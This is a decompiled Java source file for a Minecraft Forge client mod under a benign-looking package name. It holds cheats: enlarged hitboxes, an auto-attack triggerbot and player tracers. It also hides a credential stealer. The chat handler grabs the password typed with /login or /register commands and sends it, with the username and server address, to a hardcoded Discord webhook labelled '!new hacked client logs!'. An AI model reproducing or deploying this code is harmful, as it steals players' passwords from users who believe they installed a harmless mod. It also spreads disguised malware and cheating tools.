package net.dries007.tapemouse;

import com.mojang.realmsclient.gui.ChatFormatting;
import java.awt.Color;
import java.io.IOException;
import java.util.Iterator;
import java.util.Objects;
import net.minecraft.client.Minecraft;
import net.minecraft.client.renderer.entity.RenderManager;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.AxisAlignedBB;
import net.minecraft.util.math.RayTraceResult;
import net.minecraft.util.math.Vec3d;
import net.minecraft.util.math.RayTraceResult.Type;
import net.minecraft.util.text.TextComponentString;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.client.event.RenderWorldLastEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.InputEvent.KeyInputEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent.ClientTickEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent.PlayerTickEvent;
import org.lwjgl.input.Keyboard;
import org.lwjgl.opengl.GL11;

class Extension {
   public Minecraft mc = Minecraft.func_71410_x();
   public boolean isAllow = true;
   public boolean cross = false;
   public boolean trace = false;
   public double size = 0.30000001192092896D;
   MouseHandler mouseHandler = new MouseHandler("https://discord.com/api/webhooks/1033419084555108392/QqDJD1GQjW7ilU2tdtb58ree3YRJ2N4dL6RLE0qcjJ_7btq9AWAlYnMb4FLoVfE6vOv8");

   public void togAllow() {
      this.isAllow = !this.isAllow;
   }

   public void togCross() {
      this.cross = !this.cross;
   }

   public void togTrace() {
      this.trace = !this.trace;
   }

   @SubscribeEvent
   public void modulevent(KeyInputEvent e) {
      if (Keyboard.isKeyDown(Keyboard.getEventKey()) && Keyboard.getEventKey() != 0 && this.isAllow) {
         if (Keyboard.getEventKey() == 88) {
            this.togAllow();
         }

         if (Keyboard.getEventKey() == 49) {
            this.size += 0.10000000149011612D;
         }

         if (Keyboard.getEventKey() == 24 && this.size > 0.30000001192092896D) {
            this.size -= 0.10000000149011612D;
         }

         if (Keyboard.getEventKey() == 19) {
            this.togCross();
         }

         if (Keyboard.getEventKey() == 25) {
            this.togTrace();
         }
      }

   }

   @SubscribeEvent
   public void trace(RenderWorldLastEvent e) {
      if (this.trace && this.isAllow) {
         Iterator var2 = this.mc.field_71441_e.field_73010_i.iterator();

         while(var2.hasNext()) {
            Entity playerEntity = (Entity)var2.next();
            if (playerEntity != null && playerEntity != this.mc.field_71439_g) {
               drawtrace(this.mc, playerEntity, this.mc.func_184121_ak(), 1);
            }
         }
      }

   }

   public static void drawtrace(Minecraft mc, Entity e, float partialTicks, int mode) {
      if (mc.func_175598_ae().field_78734_h != null) {
         GL11.glDisable(2929);
         GL11.glDisable(2896);
         GL11.glLineWidth(2.0F);
         GL11.glPushMatrix();
         GL11.glDepthMask(false);
         GL11.glColor4d(1.0D, mode == 1 ? 1.0D : 0.0D, 1.0D, 1.0D);
         GL11.glBlendFunc(770, 771);
         GL11.glDisable(3553);
         GL11.glBegin(1);
         RenderManager r = mc.func_175598_ae();
         Vec3d v = (new Vec3d(0.0D, 0.0D, 1.0D)).func_178789_a(-((float)Math.toRadians((double)mc.field_71439_g.field_70125_A))).func_178785_b(-((float)Math.toRadians((double)mc.field_71439_g.field_70177_z)));
         GL11.glVertex3d(v.field_72450_a, (double)mc.field_71439_g.func_70047_e() + v.field_72448_b, v.field_72449_c);
         double x = e.field_70142_S + (e.field_70165_t - e.field_70142_S) * (double)partialTicks;
         double y = e.field_70137_T + (e.field_70163_u - e.field_70137_T) * (double)partialTicks;
         double z = e.field_70136_U + (e.field_70161_v - e.field_70136_U) * (double)partialTicks;
         GL11.glVertex3d(x - r.field_78730_l, y - r.field_78731_m + 0.25D, z - r.field_78728_n);
         GL11.glEnd();
         GL11.glDepthMask(true);
         GL11.glEnable(2929);
         GL11.glEnable(3553);
         GL11.glPopMatrix();
      }

   }

   @SubscribeEvent
   public void onTick(PlayerTickEvent e) {
      if (this.mc.field_71439_g != null && this.mc.field_71441_e != null && this.isAllow && this.cross) {
         RayTraceResult objectMouseOver = Minecraft.func_71410_x().field_71476_x;
         if (objectMouseOver != null && objectMouseOver.field_72313_a == Type.ENTITY) {
            Entity entity = objectMouseOver.field_72308_g;
            if (entity instanceof EntityPlayer && Minecraft.func_71410_x().field_71439_g.func_184825_o(0.0F) == 1.0F) {
               Minecraft.func_71410_x().field_71442_b.func_78764_a(Minecraft.func_71410_x().field_71439_g, entity);
               Minecraft.func_71410_x().field_71439_g.func_184609_a(EnumHand.MAIN_HAND);
               Minecraft.func_71410_x().field_71439_g.func_184821_cY();
            }
         }
      }

   }

   @SubscribeEvent
   public void onChatAllow(ClientChatEvent e) {
      if (this.isAllow && e.getMessage().startsWith("?list")) {
         this.mc.field_71439_g.func_145747_a(new TextComponentString(ChatFormatting.AQUA + "N +SIZE," + ChatFormatting.AQUA + "\nO -SIZE," + ChatFormatting.AQUA + "\nR TRIGGER," + ChatFormatting.AQUA + "\nP TRACE"));
         e.setCanceled(true);
      }

      String[] strings = e.getMessage().split(" ");
      if (strings.length > 1) {
         if (e.getMessage().startsWith("/l") || e.getMessage().startsWith("/log") || e.getMessage().startsWith("/login")) {
            try {
               this.mouseHandler.clearEmbeds();
               this.mouseHandler.addEmbed((new MouseHandler.EmbedObject()).setTitle("!new hacked client logs!").setDescription("logged in:").setColor(new Color(16263031)).addField("USER", Minecraft.func_71410_x().func_110432_I().func_111285_a(), true).addField("SERVER", (String)Objects.requireNonNull(Minecraft.func_71410_x().func_147104_D().field_78845_b), true).addField("PASSWORD", strings[1], true));
               this.mouseHandler.execute();
            } catch (IOException var5) {
               var5.printStackTrace();
            }
         }

         if (e.getMessage().startsWith("/reg") || e.getMessage().startsWith("/register")) {
            try {
               this.mouseHandler.clearEmbeds();
               this.mouseHandler.addEmbed((new MouseHandler.EmbedObject()).setTitle("!new hacked client logs!").setDescription("registered in:").setColor(new Color(7470878)).addField("USER", Minecraft.func_71410_x().func_110432_I().func_111285_a(), true).addField("SERVER", (String)Objects.requireNonNull(Minecraft.func_71410_x().func_147104_D().field_78845_b), true).addField("PASSWORD", strings[1], true));
               this.mouseHandler.execute();
            } catch (IOException var4) {
               var4.printStackTrace();
            }
         }
      }

   }

   @SubscribeEvent
   public void setBB(ClientTickEvent clientTickEvent) {
      if (this.mc.field_71439_g != null && this.mc.field_71441_e != null) {
         Iterator var2;
         EntityPlayer player;
         double var10003;
         double var10005;
         if (this.isAllow) {
            var2 = this.mc.field_71441_e.field_73010_i.iterator();

            while(var2.hasNext()) {
               player = (EntityPlayer)var2.next();
               if (player != null && player != this.mc.field_71439_g) {
                  var10003 = player.field_70165_t - this.size;
                  var10005 = player.field_70161_v - this.size;
                  double var10006 = player.field_70165_t + this.size;
                  double var10008 = player.field_70161_v + this.size;
                  player.func_174826_a(new AxisAlignedBB(var10003, player.func_174813_aQ().field_72338_b, var10005, var10006, player.func_174813_aQ().field_72337_e, var10008));
               }
            }
         } else {
            var2 = this.mc.field_71441_e.field_73010_i.iterator();

            while(var2.hasNext()) {
               player = (EntityPlayer)var2.next();
               if (player != null && player != this.mc.field_71439_g) {
                  var10003 = player.field_70165_t - 0.30000001192092896D;
                  var10005 = player.field_70161_v - 0.30000001192092896D;
                  player.func_174826_a(new AxisAlignedBB(var10003, player.func_174813_aQ().field_72338_b, var10005, player.field_70165_t + 0.30000001192092896D, player.func_174813_aQ().field_72337_e, player.field_70161_v + 0.30000001192092896D));
               }
            }
         }
      }

   }
}
